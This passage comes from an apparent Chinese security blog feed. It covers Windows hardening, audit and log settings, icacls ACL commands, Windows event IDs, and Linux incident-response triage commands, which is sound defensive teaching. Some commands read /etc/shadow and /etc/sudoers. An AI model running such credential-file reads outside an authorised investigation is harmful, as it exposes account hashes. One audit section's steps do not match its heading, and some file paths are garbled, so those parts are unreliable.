title="设置屏幕保护密码和开启时间"></a>设置屏幕保护密码和开启时间</h4><p>设置从屏幕保护恢复时需要输入密码，并将屏幕保护自动开启时间设定为五分钟。</p><p><strong>操作步骤</strong></p><blockquote><p>启用屏幕保护程序，设置等待时间为 <strong>5分钟</strong>，并启用 <strong>在恢复时使用密码保护</strong></p></blockquote><h2 id="日志配置操作"><a href="#日志配置操作" class="headerlink" title="日志配置操作"></a>日志配置操作</h2><h3 id="2-1-日志配置"><a href="#2-1-日志配置" class="headerlink" title="2.1 日志配置"></a>2.1 日志配置</h3><h4 id="审核登录"><a href="#审核登录" class="headerlink" title="审核登录"></a>审核登录</h4><p>设备应配置日志功能，对用户登录进行记录。</p><p>记录内容包括用户登录使用的帐户、登录是否成功、登录时间、以及远程登录时、及用户使用的IP地址。</p><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>本地策略</strong> &gt; <strong>审核策略</strong> 中，设置 <strong>审核登录事件</strong>。</p></blockquote><blockquote><p>eventvwr.msc &gt; 打开<strong>事件查看器</strong> &gt; <strong>windows日志</strong> &gt; <strong>安全</strong> &gt; 即可查看用户的登录和注销以及账户名等信息 </p></blockquote><h4 id="审核策略"><a href="#审核策略" class="headerlink" title="审核策略"></a>审核策略</h4><p>启用本地安全策略中对Windows系统的审核策略更改，成功和失败操作都需要审核。</p><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>本地策略</strong> &gt; <strong>审核策略</strong> 中，设置 <strong>审核策略更改</strong>。</p></blockquote><h4 id="审核对象访问"><a href="#审核对象访问" class="headerlink" title="审核对象访问"></a>审核对象访问</h4><p>启用本地安全策略中对Windows系统的审核对象访问，成功和失败操作都需要审核。</p><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>本地策略</strong> &gt; <strong>审核策略</strong> 中，设置 <strong>审核对象访问</strong>。</p></blockquote><h4 id="审核事件目录服务访问"><a href="#审核事件目录服务访问" class="headerlink" title="审核事件目录服务访问"></a>审核事件目录服务访问</h4><p>启用本地安全策略中对Windows系统的审核目录服务访问，仅需要审核失败操作。</p><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>本地策略</strong> &gt; <strong>审核策略</strong> 中，设置 <strong>审核目录服务器访问</strong>。</p></blockquote><h4 id="审核特权使用"><a href="#审核特权使用" class="headerlink" title="审核特权使用"></a>审核特权使用</h4><p>启用本地安全策略中对Windows系统的审核特权使用，成功和失败操作都需要审核。</p><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>本地策略</strong> &gt; <strong>审核策略</strong> 中，设置 <strong>审核特权使用</strong>。</p></blockquote><h4 id="审核系统事件"><a href="#审核系统事件" class="headerlink" title="审核系统事件"></a>审核系统事件</h4><p>启用本地安全策略中对Windows系统的审核系统事件，成功和失败操作都需要审核。</p><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>本地策略</strong> &gt; <strong>审核策略</strong> 中，设置 <strong>审核系统事件</strong>。</p></blockquote><h4 id="审核帐户管理"><a href="#审核帐户管理" class="headerlink" title="审核帐户管理"></a>审核帐户管理</h4><p>启用本地安全策略中对Windows系统的审核帐户管理，成功和失败操作都要审核。</p><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>本地策略</strong> &gt; <strong>审核策略</strong> 中，设置 <strong>审核帐户管理</strong>。</p></blockquote><h4 id="审核过程追踪"><a href="#审核过程追踪" class="headerlink" title="审核过程追踪"></a>审核过程追踪</h4><p>启用本地安全策略中对Windows系统的审核进程追踪，仅失败操作需要审核。</p><p><strong>操作步骤</strong></p><blockquote><p><strong>gpedit.msc 打开组策略</strong>&gt; <strong>管理模板</strong> &gt; <strong>Windows组件</strong> &gt; <strong>远程桌面服务</strong> &gt; <strong>远程桌面会话主机</strong> &gt; <strong>连接</strong></p><p>禁用 <strong>“ 将远程桌面服务用户限制到单独的远程桌面服务会话 “</strong> &gt; 启用并设置  <strong>“限制连接的数量”</strong></p></blockquote><h4 id="日志文件大小"><a href="#日志文件大小" class="headerlink" title="日志文件大小"></a>日志文件大小</h4><p>设置应用日志文件大小至少为 8192 KB，可根据磁盘空间配置日志文件大小，记录的日志越多越好。</p><p>并设置当达到最大的日志尺寸时，按需要轮询记录日志。</p><p><strong>操作步骤</strong></p><blockquote><p><strong>eventvwr.msc</strong>打开事件查看器，配置应用日志、系统日志、安全日志属性中的日志大小，以及设置当达到最大的日志尺寸时的相应策略。</p></blockquote><h2 id="安全选项"><a href="#安全选项" class="headerlink" title="安全选项"></a>安全选项</h2><h3 id="6-1-禁用未登录前关机"><a href="#6-1-禁用未登录前关机" class="headerlink" title="6.1 禁用未登录前关机"></a>6.1 禁用未登录前关机</h3><p>服务器默认是禁止在未登录系统前关机的。</p><p>如果启用此设置，服务器安全性将会大大降低，给远程连接的黑客造成可乘之机，强烈建议禁用此功能。</p><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>本地策略</strong> &gt; <strong>安全选项</strong> 中，禁用 <strong>关机: 允许系统在未登录前关机</strong> 策略</p></blockquote><h3 id="6-2-启用安全选项"><a href="#6-2-启用安全选项" class="headerlink" title="6.2 启用安全选项"></a>6.2 启用安全选项</h3><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>本地策略</strong> &gt; <strong>安全选项</strong> 中，进行如下设置：</p></blockquote><p><img src="/images/wsecxx.png" alt=""></p><h3 id="6-3其他安全配置"><a href="#6-3其他安全配置" class="headerlink" title="6.3其他安全配置"></a>6.3其他安全配置</h3><h4 id="安装杀毒软件"><a href="#安装杀毒软件" class="headerlink" title="安装杀毒软件"></a>安装杀毒软件</h4><h4 id="安装最新的补丁更新"><a href="#安装最新的补丁更新" class="headerlink" title="安装最新的补丁更新"></a>安装最新的补丁更新</h4><h4 id="禁用不必要的服务"><a href="#禁用不必要的服务" class="headerlink" title="禁用不必要的服务"></a>禁用不必要的服务</h4><p><strong>禁用TCP/IP上的NetBIOS</strong></p><p>禁用TCP/IP上的NetBIOS协议，可以关闭监听的 UDP 137（netbios-ns）、UDP 138（netbios-dgm）以及 TCP 139（netbios-ssn）端口。</p><p><strong>操作步骤</strong></p><blockquote><ol><li>在 <strong>计算机管理</strong> &gt; <strong>服务和应用程序</strong> &gt; <strong>服务</strong> 中禁用 <strong>TCP/IP NetBIOS Helper</strong> 服务。</li><li>在网络连接属性中，双击 <strong>Internet协议版本4（TCP/IPv4）</strong>，单击 <strong>高级</strong>。<strong>禁用NetBIOS</strong>和<strong>LMHOST查找</strong></li></ol></blockquote><p><a href="https://docs.microsoft.com/zh-cn/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3" target="_blank" rel="noopener">如何在 Windows 中检测、启用和禁用 SMBv1、SMBv2 和 SMBv3</a></p><h4 id="关闭默认共享"><a href="#关闭默认共享" class="headerlink" title="关闭默认共享"></a>关闭默认共享</h4><p>非域环境中，关闭Windows硬盘默认共享，例如C$，D$。</p><p><strong>操作步骤</strong></p><blockquote><p>打开 <strong>注册表编辑器</strong>，根据推荐值修改注册表键值。</p><p><strong>注意</strong>： Windows Server 2012版本已默认关闭Windows硬盘默认共享，且没有该注册表键值。</p></blockquote><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer</span><br><span class="line">#推荐值： <span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="共享文件夹授权访问"><a href="#共享文件夹授权访问" class="headerlink" title="共享文件夹授权访问"></a>共享文件夹授权访问</h4><p>每个共享文件夹的共享权限，只允许授权的帐户拥有共享此文件夹的权限。</p><p><strong>操作步骤</strong></p><blockquote><p>每个共享文件夹的共享权限仅限于业务需要，不要设置成为 <strong>Everyone</strong>。</p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>计算机管理</strong>，在 <strong>共享文件夹</strong> 中，查看每个共享文件夹的共享权限。</p></blockquote><h1 id="文件系统安全"><a href="#文件系统安全" class="headerlink" title="文件系统安全"></a>文件系统安全</h1><blockquote><p>对于 NTFS 磁盘分区上的每一个文件和文件夹，NTFS 都存储一个远程访问控制列表（ACL，Access Control Lists）</p><p>ACL 中包含有那些被授权访问该文件或者文件夹的所有用户账号、组和计算机，还包含他们被授予的访问类型。</p></blockquote><blockquote><p><strong>注意：</strong> FAT 是U盘上的主流文件系统 </p></blockquote><h2 id="NTFS-文件权限种类"><a href="#NTFS-文件权限种类" class="headerlink" title="NTFS 文件权限种类"></a>NTFS 文件权限种类</h2><h2 id="NTFS-权限设置"><a href="#NTFS-权限设置" class="headerlink" title="NTFS 权限设置"></a>NTFS 权限设置</h2><h4 id="通过-ACL-控制列表，设置目录或者文件的用户访问权限"><a href="#通过-ACL-控制列表，设置目录或者文件的用户访问权限" class="headerlink" title="通过 ACL 控制列表，设置目录或者文件的用户访问权限"></a><strong>通过 ACL 控制列表，设置目录或者文件的用户访问权限</strong></h4><blockquote><p>Windows系统中的ACL(Access Control List)，用来表示用户（组）权限的列表。</p><p>在渗透测试中，理解并运用ACL，尤其在后门利用(提权)方面，可供发挥的空间很大。</p><p>而站在防御的角度，如果系统被攻破，找到并清除攻击者留下的ACL后门，同样需要对ACL有一定的了解。</p></blockquote><h4 id="命令行下修改目录或者文件的访问权限的方法"><a href="#命令行下修改目录或者文件的访问权限的方法" class="headerlink" title="命令行下修改目录或者文件的访问权限的方法"></a><strong>命令行下修改目录或者文件的访问权限的方法</strong></h4><p><strong>一系列简单的权利：</strong></p><blockquote><ul><li><strong>F</strong>（完全访问）</li><li><strong>M</strong>（修改访问权限）</li><li><strong>RX</strong>（读取和执行访问）</li><li><strong>R</strong>（只读访问）</li><li><strong>W</strong>（只写访问）</li></ul></blockquote><p><strong>继承权：</strong></p><blockquote><ul><li><strong>（OI）</strong>：对象继承</li><li><strong>（CI）</strong>：容器继承</li><li><strong>（IO）</strong>：仅继承</li><li><strong>（NP）</strong>：不传播继承</li><li><strong>（I）</strong>：从父容器继承的权限</li></ul></blockquote><h4 id="查看指定文件的ACL"><a href="#查看指定文件的ACL" class="headerlink" title="查看指定文件的ACL"></a><strong>查看</strong>指定文件的ACL</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">icacls <span class="built_in">test</span>\test.txt</span><br></pre></td></tr></table></figure><h4 id="备份指定文件-包括当前目录及其子目录中的文件-的ACL"><a href="#备份指定文件-包括当前目录及其子目录中的文件-的ACL" class="headerlink" title="备份指定文件(包括当前目录及其子目录中的文件)的ACL"></a><strong>备份</strong>指定文件(包括当前目录及其子目录中的文件)的ACL</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">icacls <span class="built_in">test</span>\test.txt /save AclFile /t</span><br></pre></td></tr></table></figure><h4 id="还原指定文件-包括当前目录及其子目录中的文件-的ACL"><a href="#还原指定文件-包括当前目录及其子目录中的文件-的ACL" class="headerlink" title="还原指定文件(包括当前目录及其子目录中的文件)的ACL"></a><strong>还原</strong>指定文件(包括当前目录及其子目录中的文件)的ACL</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">icacls <span class="built_in">test</span>\ /restore AclFile /t</span><br><span class="line"><span class="comment">#还原时，路径需要设置为上级目录</span></span><br></pre></td></tr></table></figure><h4 id="添加用户test1对指定文件-包括当前目录及其子目录中的文件-的完全访问权限"><a href="#添加用户test1对指定文件-包括当前目录及其子目录中的文件-的完全访问权限" class="headerlink" title="添加用户test1对指定文件(包括当前目录及其子目录中的文件)的完全访问权限"></a><strong>添加</strong>用户test1对指定文件(包括当前目录及其子目录中的文件)的完全访问权限</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">icacls <span class="built_in">test</span>\test.txt /grant test1:(OI)(CI)(F) /t</span><br></pre></td></tr></table></figure><h4 id="移除用户test1对指定文件-包括当前目录及其子目录中的文件-的完全访问权限"><a href="#移除用户test1对指定文件-包括当前目录及其子目录中的文件-的完全访问权限" class="headerlink" title="移除用户test1对指定文件(包括当前目录及其子目录中的文件)的完全访问权限"></a><strong>移除</strong>用户test1对指定文件(包括当前目录及其子目录中的文件)的完全访问权限</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">icacls <span class="built_in">test</span>\test.txt /remove test1 /t</span><br></pre></td></tr></table></figure><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%8B%E7%9A%84Access-Control-List/" target="_blank" rel="noopener">ACL在渗透测试中的利用</a></p><h1 id="Windows日志审计"><a href="#Windows日志审计" class="headerlink" title="Windows日志审计"></a>Windows日志审计</h1><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">eventvwr.msc#打开日志查看器</span><br></pre></td></tr></table></figure><h2 id="日志分类"><a href="#日志分类" class="headerlink" title="日志分类"></a>日志分类</h2><p><strong>系统日志</strong></p><blockquote><p>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。<br>系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。<br>默认位置：<code>%SystemRoot%System32WinevtLogsSystem.evtx</code></p></blockquote><p><strong>应用程序日志</strong></p><blockquote><p>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件<br>例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。<br>如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。<br>默认位置：<code>%SystemRoot%System32WinevtLogsApplication.evtx</code></p></blockquote><p><strong>安全日志</strong></p><blockquote><p>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。<br>安全日志也是调查取证中最常用到的日志。<br>默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志<br>或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。<br>默认位置：<code>%SystemRoot%System32WinevtLogsSecurity.evtx</code></p></blockquote><p>系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。</p><p>安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。</p><h2 id="事件日志分析"><a href="#事件日志分析" class="headerlink" title="事件日志分析"></a>事件日志分析</h2><p><strong>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义</strong></p><table><thead><tr><th align="left">事件ID</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">4624</td><td align="left">登录成功</td></tr><tr><td align="left">4625</td><td align="left">登录失败</td></tr><tr><td align="left">4634</td><td align="left">注销成功</td></tr><tr><td align="left">4647</td><td align="left">用户启动的注销</td></tr><tr><td align="left">4672</td><td align="left">使用超级用户（如管理员）进行登录</td></tr><tr><td align="left">4720</td><td align="left">创建用户</td></tr></tbody></table><p><strong>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</strong></p><table><thead><tr><th align="left">登录类型</th><th align="left">描述</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">c（Interactive）</td><td align="left">用户在本地进行登录。</td></tr><tr><td align="left">3</td><td align="left">网络（Network）</td><td align="left">最常见的情况就是连接到共享文件夹或共享打印机时。</td></tr><tr><td align="left">4</td><td align="left">批处理（Batch）</td><td align="left">通常表明某计划任务启动。</td></tr><tr><td align="left">5</td><td align="left">服务（Service）</td><td align="left">每种服务都被配置在某个特定的用户账号下运行。</td></tr><tr><td align="left">7</td><td align="left">解锁（Unlock）</td><td align="left">屏保解锁。</td></tr><tr><td align="left">8</td><td align="left">网络明文（NetworkCleartext）</td><td align="left">登录的密码在网络上是通过明文传输的，如FTP。</td></tr><tr><td align="left">9</td><td align="left">新凭证（NewCredentials）</td><td align="left">使用带/Netonly参数的RUNAS命令运行一个程序。</td></tr><tr><td align="left">10</td><td align="left">远程交互，(RemoteInteractive）</td><td align="left">通过终端服务、远程桌面或远程协助访问计算机。</td></tr><tr><td align="left">11</td><td align="left">缓存交互（CachedInteractive）</td><td align="left">以一个域用户登录而又没有域控制器可</td></tr></tbody></table><h4 id="更多事件ID说明-（建议浏览3遍）"><a href="#更多事件ID说明-（建议浏览3遍）" class="headerlink" title="更多事件ID说明-（建议浏览3遍）"></a><a href="https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008" target="_blank" rel="noopener">更多事件ID说明-（建议浏览3遍）</a></h4><p>–</p><h4 id="使用日志分析工具"><a href="#使用日志分析工具" class="headerlink" title="使用日志分析工具"></a><a href="https://dotblogs.com.tw/kinanson/2017/08/18/145528#1" target="_blank" rel="noopener">使用日志分析工具</a></h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;账户管理和认证授权&quot;&gt;&lt;a href=&quot;#账户管理和认证授权&quot; class=&quot;headerlink&quot; title=&quot;账户管理和认证授权&quot;&gt;&lt;/a&gt;账户管理和认证授权&lt;/h2&gt;&lt;h3 id=&quot;1-1-账户&quot;&gt;&lt;a href=&quot;#1-1-账户&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="【3】红蓝对抗" scheme="https://wintrysec.github.io/categories/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
      <category term="【8 蓝队】基线加固" scheme="https://wintrysec.github.io/categories/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%908-%E8%93%9D%E9%98%9F%E3%80%91%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>【蓝队】应急响应</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%90%E5%8D%81%20%E8%93%9D%E9%98%9F%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <id>https://wintrysec.github.io/2020/08/12/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%90%E5%8D%81%20%E8%93%9D%E9%98%9F%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</id>
    <published>2020-08-12T14:00:00.000Z</published>
    <updated>2020-08-21T08:38:57.412Z</updated>
    
    <content type="html"><![CDATA[<h1 id="应急响应模型"><a href="#应急响应模型" class="headerlink" title="应急响应模型"></a>应急响应模型</h1><h3 id="PDCERF模型"><a href="#PDCERF模型" class="headerlink" title="PDCERF模型"></a>PDCERF模型</h3><blockquote><p><strong>Prepare（准备）：</strong>准备用来检测的工具和人</p><p><strong>Detection（检测与分析）：</strong></p><p>紧急事件监测，包括防火墙、系统、web服务器、IDS/WAF/SIEM中的日志，不正常或者是执行了越权操作的用户</p><p>甚至还有管理员的报告(收到的邮件和短信)， 从这些数据中判断出受灾面积和攻击者入侵的点 </p><p><strong>Containment（抑制缓解）：</strong></p><p>首先先控制受害范围，不要让攻击的影响继续蔓延到其他的IT资产和业务环境，切记不要直接一股脑的投入全部精力到封堵后门。</p><p>紧接着要做的是去寻找根源原因，彻底解决，封堵攻击源，把业务恢复到正常水平</p><p><strong>Eradication（攻击根除）</strong></p><p><strong>Recover（业务恢复）</strong></p><p><strong>Follow-Up（事件跟踪）</strong>：</p><p>根据各种监控去确定没有其他的攻击行为和攻击向量，紧接着就是开会反省此次事件，写报告，持续改进工作流程</p></blockquote><h3 id="马斯洛层次"><a href="#马斯洛层次" class="headerlink" title="马斯洛层次"></a>马斯洛层次</h3><p>  对于防御模型来说 ，描绘了防御模型的建立和迭代 </p><blockquote><p><strong>LV0：不设防</strong>：也就是没有任何安全措施</p><p><strong>LV1：认为自己是安全的</strong>：</p><p>通过一些较为基础的安全措施做到基础的ACL，并且系统不存在任何的明显的漏洞。</p><p>但是不具备复杂时间的应急响应，需要购买安全服务。</p><p>这里评价的标准是：有一个信息安全团队并且保证交付的代码、服务器的环境没有明显的漏洞，并且做过渗透测试。</p><p><strong>LV2：基本的应急响应：有攻防的能力</strong>，</p><p>并且可以在不依赖外部安全服务的情况下做到能对大型信息安全突发事件进行抢救和修复，但是安全防护的体系并没有完全建立。</p><p>这里评价的标准是：有一个攻防能力较强的安全团队，并且具备应急响应的能力。</p><p><strong>LV3：安全体系建立</strong>：</p><p>到了这个阶段，安全工作应该具有一个完善的体系，能够覆盖全生命周期，开发与运维的环境有一个必要的流程，</p><p>在一些业务和资产的架构上都会考虑安全问题，检测和安全防护手段能够根据不同的攻击场景针对性的调整。</p><p>这里的评价标准包括：具备一个完整的纵深防御体系并且能够覆盖日常的应急响应和安全防护。</p><p><strong>LV4</strong>：除了保证基本的架构、应用和数据的安全之外，还能够在业务层面上也具有一个系统化的安全解决方案，</p><p>这时候对抗的方式不仅仅来自于平时攻击的时间，还要关注业务逻辑方面的安全和跟高级别的攻击者（比如高级攻击者和黑产团队）的对抗。</p><p>这里需要建立更高强度的风控体系和域安全措施，诸如安全域、账号体系、基础服务等。</p><p><strong>LV5：高级安全手段</strong>：</p><p>以上层次基本上满足了吃饱吃好的要求，到了这个阶段就是前面说的吃出逼格、吃出花样的时候了。</p><p>这个阶段要引进业界先进的技术诸如态势感知、威胁情报体系、机器学习、深度学习、</p><p>人工智能等业界前沿的技术来加入到安全管控体系中，也就是我们常说的最佳实践。</p><p>这里要具备完整的纵深防御体系，要具备和攻击者精确对抗，能够完全了解谁在攻击我们，</p><p>并且优化攻击拦截的成功率、及时性、准确性和自动化程度。 </p></blockquote><h3 id="ROI（投资回报率）"><a href="#ROI（投资回报率）" class="headerlink" title="ROI（投资回报率）"></a>ROI（投资回报率）</h3><p>评价企业安全建设做的好与坏的标准就是ROI（投资回报率）</p><p>也就是能够利用较低的成本来防御较高成本的网络攻击</p><p>举个例子，别人打你一波DDoS需要花10块钱，而你防御住这个10块钱的攻击和对你造成的影响只有1毛钱，这说明攻击防御是有效的；</p><p>反之，如果你防御这些攻击对你造成的影响和防御成本是100块钱，这样你的ROI就有问题了，防御可能需要继续优化或者重新思考。</p><p>而对于一个安全负责人来说，影响投资回报率的因素如下： </p><blockquote><ul><li><p><strong>系统化：</strong>具备一个系统化的蓝图，对安全建设有着大局观和感性认知</p></li><li><p><strong>管理体系化</strong>：这里详细说其实是两部分，也就是工具链建设（管理工具）和团队建设（管理人）</p><p>体系化有助于安全建设，并且能够增加响应能力。</p></li><li><p><strong>机遇与风险并存：</strong>做安全一定要能接受风险，并不是一个checklist的问题</p><p>checklist只能帮助你去建设并不能彻底杜绝安全问题，安全问题是人祸，一定程度上也会存在“天灾”。</p></li><li><p><strong>安全定位：</strong>要知道自己几斤几两，企业现有的安全措施在整个行业来说是什么水平，如何提高水平。</p></li><li><p><strong>能力匹配：</strong>安全团队的发展一定要跟得上公司的扩张速度，不能该激进的时候保守。</p></li><li><p><strong>大局观：</strong>安全不是一个团队的事情，是整个公司的事情，与各部门积极配合和沟通是必要的。</p></li></ul></blockquote><h3 id="威胁建模"><a href="#威胁建模" class="headerlink" title="威胁建模"></a>威胁建模</h3><blockquote><p>Spoofing（假冒）</p><p>Tampering（篡改）</p><p>Reputation（否认）</p><p>Information Disclosure（信息泄露）</p><p>DoS（拒绝服务）</p><p>Elevation of Privilege（提权） </p></blockquote><h1 id="应急响应流程"><a href="#应急响应流程" class="headerlink" title="应急响应流程"></a>应急响应流程</h1><blockquote><p>主要有两大方面，<strong>系统入侵排查和日志分析</strong></p></blockquote><h2 id="Linux入侵排查思路"><a href="#Linux入侵排查思路" class="headerlink" title="Linux入侵排查思路"></a>Linux入侵排查思路</h2><h3 id="账号安全"><a href="#账号安全" class="headerlink" title="账号安全"></a><strong>账号安全</strong></h3><p>先查看基础用户信息文件(/etc/passwd，/etc/shadow，/etc/group)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、查询特权用户特权用户(uid 为0)</span><br><span class="line">awk -F: <span class="string">'$3==0&#123;print $1&#125;'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line">2、查询可以远程登录的帐号信息</span><br><span class="line">awk <span class="string">'/\$1|\$6/&#123;print $1&#125;'</span> /etc/shadow</span><br><span class="line"></span><br><span class="line">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">more /etc/sudoers | grep -v <span class="string">"^#\|^$"</span> | grep <span class="string">"ALL=(ALL)"</span></span><br><span class="line"></span><br><span class="line">4、禁用或删除多余及可疑的帐号</span><br><span class="line">usermod -L user    <span class="comment">#禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头</span></span><br><span class="line">userdel -r user    <span class="comment">#将删除user用户，并且将/home目录下的user目录一并删除</span></span><br></pre></td></tr></table></figure><h3 id="查看历史命令"><a href="#查看历史命令" class="headerlink" title="查看历史命令"></a><strong>查看历史命令</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat ~/bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></figure><h3 id="检查网络连接"><a href="#检查网络连接" class="headerlink" title="检查网络连接"></a><strong>检查网络连接</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看 PID 所对应的进程文件路径</span></span><br><span class="line">ls /proc/<span class="variable">$PID</span>/exe</span><br><span class="line">file /proc/<span class="variable">$PID</span>/exe</span><br></pre></td></tr></table></figure><h3 id="检查异常进程"><a href="#检查异常进程" class="headerlink" title="检查异常进程"></a><strong>检查异常进程</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></figure><h3 id="检查开机启动项"><a href="#检查开机启动项" class="headerlink" title="检查开机启动项"></a><strong>检查开机启动项</strong></h3><p>系统运行级别示意图：</p><table><thead><tr><th align="center">运行级别</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">关机</td></tr><tr><td align="center">1</td><td align="center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td></tr><tr><td align="center">2</td><td align="center">不完全的命令行模式，不含NFS服务</td></tr><tr><td align="center">3</td><td align="center">完全的命令行模式，就是标准字符界面</td></tr><tr><td align="center">4</td><td align="center">系统保留</td></tr><tr><td align="center">5</td><td align="center">图形模式</td></tr><tr><td align="center">6</td><td align="center">重启动</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#系统默认允许级别</span></span><br><span class="line">vi  /etc/inittab</span><br><span class="line">id=3：initdefault  <span class="comment">#系统开机后直接进入哪个运行级别</span></span><br></pre></td></tr></table></figure><p>当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在<code>/etc/init.d</code>目录下，然后在<code>/etc/rc.d/rc*.d</code>中建立软链接即可 </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</span><br><span class="line"><span class="comment">#S开头代表加载时自启动</span></span><br></pre></td></tr></table></figure><h3 id="检查定时任务"><a href="#检查定时任务" class="headerlink" title="检查定时任务"></a><strong>检查定时任务</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -al /var/spool/cron/* </span><br><span class="line">cat /etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line"><span class="comment">#查看目录下所有文件</span></span><br><span class="line">more /etc/cron.d/*</span><br><span class="line"></span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure><p><a href="http://blog.lujun9972.win/blog/2018/04/19/%E4%BD%BF%E7%94%A8anacron%E5%AE%9A%E6%9C%9F%E6%89%A7%E8%A1%8C%E4%BB%BB%E5%8A%A1/index.html" target="_blank" rel="noopener">anacrontab是啥</a></p><h3 id="检查服务"><a href="#检查服务" class="headerlink" title="检查服务"></a><strong>检查服务</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chkconfig  --list  <span class="comment">#查看服务自启动状态，可以看到所有的RPM包安装的服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#源码包安装的服务位置</span></span><br><span class="line">/user/<span class="built_in">local</span>/</span><br></pre></td></tr></table></figure><h3 id="检查异常文件"><a href="#检查异常文件" class="headerlink" title="检查异常文件"></a><strong>检查异常文件</strong></h3><blockquote><p>1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</p><p>2、针对可疑文件可以使用<code>stat</code>查看创建修改时间</p><p>3、发现WebShell、远控木马的创建时间</p><p><strong>如何找出同一时间范围内创建的文件？</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find ./ -iname <span class="string">"*"</span> -atime 1 -<span class="built_in">type</span> f </span><br><span class="line"><span class="comment">#找出 ./ 下一天前访问过的文件</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="检查系统日志"><a href="#检查系统日志" class="headerlink" title="检查系统日志"></a><strong>检查系统日志</strong></h3><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">记录系统定时任务相关的日志</td></tr><tr><td align="center">/var/log/message</td><td align="center">记录Linux操作系统常见的系统和服务错误信息(首要检查对象)</td></tr><tr><td align="center">/var/log/btmp</td><td 